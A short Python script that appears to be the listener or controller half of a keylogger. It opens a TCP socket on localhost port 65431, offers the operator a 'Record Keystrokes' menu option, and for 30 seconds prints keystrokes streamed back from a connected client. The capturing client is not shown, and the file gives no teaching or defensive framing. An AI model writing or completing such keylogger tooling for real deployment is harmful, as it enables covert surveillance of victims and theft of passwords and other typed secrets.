import socket
import time

HOST = '127.0.0.1'
PORT = 65431

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)

print("Server started at", HOST, "on port", PORT)

conn, addr = server.accept()
print("Connection from", addr)

while True:
    data = conn.recv(1024)
    if not data:
        break
    print("Received from", addr, ":", data.decode())
    choice = input("What do you want to do?\n1. Record Keystrokes\n2. Exit\nEnter your choice: ")
    conn.send(choice.encode())
    if choice == "1":
        start_time = time.time()
        while True:
            if time.time() - start_time > 30:
                break
            keystroke = conn.recv(1024).decode('utf-8')
            if not keystroke :
                break
            print(keystroke, end=" ")
    if choice == "2":
        break

conn.close()
server.close()